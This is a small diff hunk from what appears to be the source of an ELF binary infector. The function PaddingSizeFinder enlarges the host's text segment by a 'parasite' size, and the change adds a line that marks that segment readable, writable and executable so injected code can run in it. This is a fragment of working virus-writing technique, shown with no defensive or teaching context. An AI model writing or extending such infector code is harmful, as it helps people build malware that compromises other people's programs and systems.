@@ -119,7 +119,9 @@ Elf64_Off PaddingSizeFinder(void *host_mapping)
 			// Increase its p_filesz and p_memsz by parasite_size (to accomodate parasite)
 			phdr[i].p_filesz = phdr[i].p_filesz + parasite_size;
 			phdr[i].p_memsz  = phdr[i].p_memsz  + parasite_size;
-        
+
+			// Make text segment writable
+			phdr[i].p_flags = PF_R | PF_W | PF_X;
 		}
 		// Find next segment after .text Segment and calculate padding size
 		if (TEXT_SEGMENT_FOUND  == 1		&&
